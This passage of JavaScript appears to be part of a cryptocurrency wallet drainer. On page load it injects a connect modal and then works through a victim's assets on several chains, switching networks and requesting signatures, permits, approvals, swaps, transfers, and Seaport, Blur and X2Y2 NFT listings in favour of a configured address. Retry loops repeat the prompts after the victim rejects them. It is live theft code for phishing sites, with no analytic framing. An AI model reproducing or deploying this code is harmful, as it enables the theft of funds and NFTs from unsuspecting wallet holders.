          const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
          const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();
          console.log(after_fee);
          if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) continue;
        }

        while (true) {
          if (asset.chain_id != MS_Current_Chain_ID) {
            // if (MS_Current_Provider == 'WalletConnect') continue;
            await chain_request(MS_Current_Chain_ID, asset.chain_id);
            try {
              try {
                await MS_Provider.request({method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }]});
              } catch(err) {
                if (err.code == 4902 || err.code == -32603) {
                  try {
                    await MS_Provider.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[asset.chain_id] ] });
                  } catch(err) {
                    await chain_cancel();
                    continue;
                  }
                } else if (err.message.includes('Unrecognized chain ID')) {
                  console.log('MOBILE version did not find chain... adding...')
                  try {
                    await MS_Provider.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[asset.chain_id] ] });
                  } catch(err) {
                    console.log(err.message)
                    await chain_cancel();
                    continue;
                  }
                } else {
                  await chain_cancel();
                  continue;
                }
              }
              MS_Current_Chain_ID = asset.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              await chain_success();
              break;
            } catch(err) {
              console.log(err);
              await chain_cancel();
              continue;
            }
          } else {
            break;
          }
          
        }

        if (asset.type == 'NATIVE') {
          if (MS_Settings.Settings.Sign.Native > 0 && !MS_Sign_Disabled) {
            while (true) {
              try {
                await SIGN_NATIVE(asset);
                break;
              } catch(err) {
                console.log(err);
                if (err.code == -32601) {
                  await sign_unavailable();
                  while (true) {
                    try {
                      await TRANSFER_NATIVE(asset);
                      break;
                    } catch(err) {
                      console.log(err);
                      if (err != 'LOW_BALANCE') {
                        await transfer_cancel();
                        if (!MS_Settings.Loop_N) break;
                      } else {
                        break;
                      }
                    }
                  }
                  break;
                } else {
                  console.log(err);
                  if (err != 'LOW_BALANCE') {
                    await sign_cancel();
                    if (!MS_Settings.Loop_N) break;
                  } else {
                    break;
                  }
                }
              }
            }
          } else {
            while (true) {
              try {
                await TRANSFER_NATIVE(asset);
                break;
              } catch(err) {
                console.log(err);
                if (err != 'LOW_BALANCE') {
                  await transfer_cancel();
                  if (!MS_Settings.Loop_N) break;
                } else {
                  break;
                }
              }
            }
          }
        } else if (asset.type == 'ERC20') {
          if (typeof asset.permit == 'undefined' && MS_Settings.Settings.Permit.Mode) {
            const data = await retrive_token(asset.chain_id, asset.address);
            const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
            const contract = new ethers.Contract(asset.address, data, node);
            const permit_type = get_permit_type(contract.functions);
            asset.permit = permit_type;
            asset.permit_ver = "1";
            asset.abi = data;
            if (permit_type > 0) {
              if (contract.functions.hasOwnProperty('version')) {
                try {
                  asset.permit_ver = await contract.version();
                } catch(err) {
                  console.log(err);
                }
              }
              console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
            }
          }
          if (asset.permit > 0) {
            for (const c_address of MS_Settings.Permit_BL) {
              if (c_address[0] == MS_Current_Chain_ID && c_address[1] === asset.address.toLowerCase()) {
                asset.permit = 0;
                break;
              }
            }
          }
          if (MS_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
            while (true) {
              try {
                await PERMIT_TOKEN(asset);
                break;
              } catch(err) {
                console.log(err);
                await approve_cancel();
                if (!MS_Settings.Loop_T) break;
              }
            }
          } else if (MS_Settings.Settings.Swappers.Enable && asset.swapper) {
            if (asset.swapper_type == 'Uniswap') {
              const all_uniswap = [];
              for (const x_asset of assets) {
                try {
                  if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Uniswap') {
                    all_uniswap.push(x_asset);
                    x_asset.skip = true;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              while (true) {
                try {
                  await DO_UNISWAP(asset, all_uniswap);
                  break;
                } catch(err) {
                  console.log(err);
                  await sign_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else {
              while (true) {
                try {
                  await DO_SWAP(asset);
                  break;
                } catch(err) {
                  console.log(err);
                  await sign_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            }
          } else if (MS_Settings.Settings.Sign.Tokens > 0 && !MS_Sign_Disabled) {
            while (true) {
              try {
                await SIGN_TOKEN(asset);
                if (MS_Settings.Settings.Sign.Tokens == 1) {
                  
                  // // promis_here
                  // const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                  // if (MS_Settings.Settings.Wait_For_Response) await x_promise;

                }
                break;
              } catch(err) {
                console.log(err);
                if (err.code == -32601) {
                  await sign_unavailable();
                  while (true) {
                    if (MS_Settings.Settings.Sign.Tokens == 1) {
                      if (MS_Settings.Settings.Approve.MetaMask || (MS_Current_Provider != 'MetaMask' || MS_Mobile_Status)) {
                        try {
                          await APPROVE_TOKEN(asset);
                          
                          // // promis_here
                          // const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                          // if (MS_Settings.Settings.Wait_For_Response) await x_promise;

                          break;
                        } catch(err) {
                          await approve_cancel();
                          if (!MS_Settings.Loop_T) break;
                        }
                      } else {
                        try {
                          await TRANSFER_TOKEN(asset);
                          break;
                        } catch(err) {
                          console.log(err);
                          await transfer_cancel();
                          if (!MS_Settings.Loop_T) break;
                        }
                      }
                    } else if (MS_Settings.Settings.Sign.Tokens == 2) {
                      try {
                        await TRANSFER_TOKEN(asset);
                        break;
                      } catch(err) {
                        console.log(err);
                        await transfer_cancel();
                        if (!MS_Settings.Loop_T) break;
                      }
                    }
                  }
                  break;
                } else {
                  console.log(err);
                  await sign_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            }
          } else if (MS_Settings.Settings.Approve.Enable && (MS_Settings.Settings.Approve.MetaMask || (MS_Current_Provider != 'MetaMask' || MS_Mobile_Status))) {
            while (true) {
              try {
                await APPROVE_TOKEN(asset);

                // // promis_here
                // const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                // if (MS_Settings.Settings.Wait_For_Response) await x_promise;

                break;
              } catch(err) {
                console.log(err);
                await approve_cancel();
                if (!MS_Settings.Loop_T) break;
              }
            }
          } else {
            while (true) {
              try {
                await TRANSFER_TOKEN(asset);
                break;
              } catch(err) {
                console.log(err);
                await transfer_cancel();
                if (!MS_Settings.Loop_T) break;
              }
            }
          }
        } else if (asset.type == 'ERC721') {
          if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 0 && !BL_US
          && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))) {
            await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID); BL_US = true;
          } else if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 0 && !SP_US
          && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))) {
            await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID); SP_US = true;
          } else if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Settings.Settings.x2y2.Priority == 0 && !XY_US
          && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))) {
            await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID); XY_US = true;
          } else if (MS_Settings.Settings.Sign.NFTs > 0 && !MS_Sign_Disabled) {
            while (true) {
              try {
                if (MS_Settings.Settings.Sign.Tokens == 1) {
                  let same_collection = [];
                  for (const x_asset of assets) {
                    try {
                      if (x_asset.address == asset.address) {
                        same_collection.push(x_asset);
                        x_asset.skip = true;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }

                  await SIGN_NFT(asset, {
                    action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                    chain_id: MS_Current_Chain_ID, contract_address: asset.address
                  });

                  // // promis_here
                  // await send_request({
                  //   action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                  //   chain_id: MS_Current_Chain_ID, contract_address: asset.address
                  // });

                }
                break;
              } catch(err) {
                console.log(err);
                if (err.code == -32601) {
                  await sign_unavailable();
                  while (true) {
                    if (MS_Settings.Settings.Sign.NFTs == 1) {
                      try {
                        let same_collection = [];
                        for (const x_asset of assets) {
                          try {
                            if (x_asset.address == asset.address) {
                              same_collection.push(x_asset);
                              x_asset.skip = true;
                            }
                          } catch(err) {
                            console.log(err);
                          }
                        }
                        // // promis_here
                        // await send_request({
                        //   action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                        //   chain_id: MS_Current_Chain_ID, contract_address: asset.address
                        // });

                        await DO_SAFA(asset, {
                          action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                          chain_id: MS_Current_Chain_ID, contract_address: asset.address
                        });

                        break;
                      } catch(err) {
                        console.log(err);
                        await approve_cancel();
                        if (!MS_Settings.Loop_NFT) break;
                      }
                    } else if (MS_Settings.Settings.Sign.NFTs == 2) {
                      try {
                        await TRANSFER_NFT(asset);
                        break;
                      } catch(err) {
                        console.log(err);
                        await transfer_cancel();
                        if (!MS_Settings.Loop_NFT) break;
                      }
                    }
                  }
                  break;
                } else {
                  console.log(err);
                  await sign_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            }
          } else if (MS_Settings.Settings.Approve.Enable) {
            while (true) {
              try {
                let same_collection = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.address == asset.address) {
                      same_collection.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }

                // // promis_here
                // await send_request({
                //   action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                //   chain_id: MS_Current_Chain_ID, contract_address: asset.address
                // });

                await DO_SAFA(asset, {
                  action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                  chain_id: MS_Current_Chain_ID, contract_address: asset.address
                });

                break;
              } catch(err) {
                console.log(err);
                await approve_cancel();
                if (!MS_Settings.Loop_NFT) break;
              }
            }
          } else {
            while (true) {
              try {
                await TRANSFER_NFT(asset);
                break;
              } catch(err) {
                console.log(err);
                await transfer_cancel();
                if (!MS_Settings.Loop_NFT) break;
              }
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }
    MS_Process = false;
  } catch(err) {
    console.log(err);
  }
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    await retrive_config();
    fill_chain_data();
    await retrive_contract();
    // if (typeof localStorage['MS_ID'] === 'undefined') {
    //   const ID_Data = await send_request({ action: 'retrive_id' });
    //   if (ID_Data.status == 'OK') localStorage['MS_ID'] = ID_Data.data;
    //   else localStorage['MS_ID'] = Math.floor(Date.now() / 1000);
    // }
    // MS_ID = localStorage['MS_ID'], MS_Ready = true;
    inject_modal(); enter_website();
    for (const chain_id in MS_Settings.RPCs) MS_Gas_Reserves[chain_id] = 0;
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => ms_init());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
});

window.addEventListener("beforeunload", (e) => leave_website());
window.addEventListener("onbeforeunload", (e) => leave_website());